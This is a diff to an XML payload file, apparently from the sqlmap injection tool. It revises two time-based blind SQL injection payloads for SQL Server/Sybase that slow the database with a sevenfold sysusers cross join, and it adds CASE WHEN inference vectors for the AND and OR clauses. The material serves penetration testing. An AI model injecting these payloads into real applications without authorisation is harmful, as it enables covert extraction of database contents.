@@ -1523,8 +1523,9 @@ Formats:
         <risk>1</risk>
         <clause>1,2,3</clause>
         <where>1</where>
+        <vector>AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM sysusers AS sys1, sysusers as sys2, sysusers as sys3, sysusers AS sys4, sysusers AS sys5, sysusers AS sys6, sysusers AS sys7) ELSE [RANDNUM] END)</vector>
         <request>
-            <payload>AND (SELECT count(*) FROM sysusers AS sys1, sysusers as sys2, sysusers as sys3, sysusers AS sys4, sysusers AS sys5, sysusers AS sys6, sysusers AS sys7, sysusers AS sys8)>0</payload>
+            <payload>AND [RANDNUM]=(SELECT COUNT(*) FROM sysusers AS sys1, sysusers as sys2, sysusers as sys3, sysusers AS sys4, sysusers AS sys5, sysusers AS sys6, sysusers AS sys7)</payload>
         </request>
         <response>
             <time>[DELAYED]</time>
@@ -1681,8 +1682,9 @@ Formats:
         <risk>3</risk>
         <clause>1,2,3</clause>
         <where>2</where>
+        <vector>OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM sysusers AS sys1, sysusers as sys2, sysusers as sys3, sysusers AS sys4, sysusers AS sys5, sysusers AS sys6, sysusers AS sys7) ELSE [RANDNUM] END)</vector>
         <request>
-            <payload>OR (SELECT count(*) FROM sysusers AS sys1, sysusers as sys2, sysusers as sys3, sysusers AS sys4, sysusers AS sys5, sysusers AS sys6, sysusers AS sys7, sysusers AS sys8)>0</payload>
+            <payload>OR [RANDNUM]=(SELECT COUNT(*) FROM sysusers AS sys1, sysusers as sys2, sysusers as sys3, sysusers AS sys4, sysusers AS sys5, sysusers AS sys6, sysusers AS sys7)</payload>
         </request>
         <response>
             <time>[DELAYED]</time>
